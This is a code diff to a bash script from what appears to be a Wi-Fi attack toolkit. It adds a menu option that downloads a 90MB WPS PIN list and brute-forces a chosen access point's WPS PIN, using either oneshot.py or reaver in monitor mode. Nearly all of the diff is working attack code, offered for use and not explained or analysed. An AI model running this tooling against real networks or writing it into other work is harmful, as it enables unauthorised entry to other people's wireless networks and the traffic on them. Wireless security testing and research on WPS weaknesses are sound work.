@@ -45,6 +45,28 @@ log_dir="$workdir/logs"
 
 : "${SNX_ONESHOT:=/sdcard/nh_files/modules/oneshot.py}"
 
+PIN_FILE="$workdir/wps-pins-all-possible.txt"
+
+download_pin_file() {
+    local target_dir="$1"
+    local pin_url="https://raw.githubusercontent.com/dtrail/sniffixx/pins/wps-pins-all-possible.txt"
+    local pin_file="$target_dir/wps-pins-all-possible.txt"
+    
+    if [[ -f "$pin_file" ]]; then
+        return 0
+    fi
+    
+    echo -e "${YELLOW}Downloading WPS PIN file (90MB)...${NC}"
+    if curl -L -o "$pin_file" "$pin_url" 2>/dev/null; then
+        echo -e "${GREEN}✓ PIN file downloaded${NC}"
+        return 0
+    else
+        echo -e "${RED}✗ Failed to download PIN file${NC}"
+        echo "Download manually from: $pin_url"
+        return 1
+    fi
+}
+
 # hcxdumptool version detection
 check_hcxdumptool_version() {
     local version
@@ -590,7 +612,8 @@ fi
         echo "5. Custom Pin"
         echo "6. Attack with pre-computed PINs"
         echo "7. Loop Mode"
-        echo "8. Back to main menu"
+        echo "8. Special Brute Force (PIN file)"
+        echo "9. Back to main menu"
 
         read -p "Choose an option: " option
 
@@ -649,6 +672,9 @@ fi
                 fi
                 ;;
             8)
+                special_bruteforce_menu
+                ;;
+            9)
                 break
                 ;;
             *)
@@ -656,6 +682,69 @@ fi
                 ;;
         esac
     done
+}
+
+special_bruteforce_menu() {
+    if [[ -z "$adapter" ]]; then
+        echo "No adapter selected. Please select a Wi-Fi adapter first."
+        return 1
+    fi
+    
+    echo ""
+    echo "=== Special Brute Force (PIN File) ==="
+    read -p "Enter target BSSID: " bssid
+    
+    if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+        echo "Invalid BSSID format (expected: XX:XX:XX:XX:XX:XX)"
+        return 1
+    fi
+    
+    echo ""
+    echo "Select attack method:"
+    echo "1. oneshot.py (fast, WiFi interface)"
+    echo "2. Monitor mode (reaver, requires monitor mode)"
+    read -p "Choice [1]: " method
+    method="${method:-1}"
+    
+    case $method in
+        1)
+            echo "Using oneshot.py with PIN file..."
+            if [[ ! -f "$SNX_ONESHOT" ]]; then
+                echo "oneshot.py not found at $SNX_ONESHOT"
+                return 1
+            fi
+            if [[ ! -f "$PIN_FILE" ]]; then
+                download_pin_file "$workdir" || return 1
+            fi
+            python3 "$SNX_ONESHOT" -i "$adapter" -b "$bssid" -d "$PIN_FILE"
+            ;;
+        2)
+            echo "Using monitor mode with reaver..."
+            if ! command -v reaver &>/dev/null; then
+                echo "reaver not found. Install with: apt install reaver"
+                return 1
+            fi
+            if ! command -v wash &>/dev/null; then
+                echo "wash not found. Install with: apt install reaver"
+                return 1
+            fi
+            
+            local mon_adapter="${adapter}mon"
+            airmon-ng start "$adapter" >/dev/null 2>&1
+            
+            if [[ ! -f "$PIN_FILE" ]]; then
+                download_pin_file "$workdir" || { airmon-ng stop "$mon_adapter" >/dev/null 2>&1; return 1; }
+            fi
+            
+            echo "Starting reaver with PIN file..."
+            reaver -i "$mon_adapter" -b "$bssid" -d 1 -f -vv -D "$PIN_FILE"
+            
+            airmon-ng stop "$mon_adapter" >/dev/null 2>&1
+            ;;
+        *)
+            echo "Invalid choice"
+            ;;
+    esac
 }
 
 while true; do
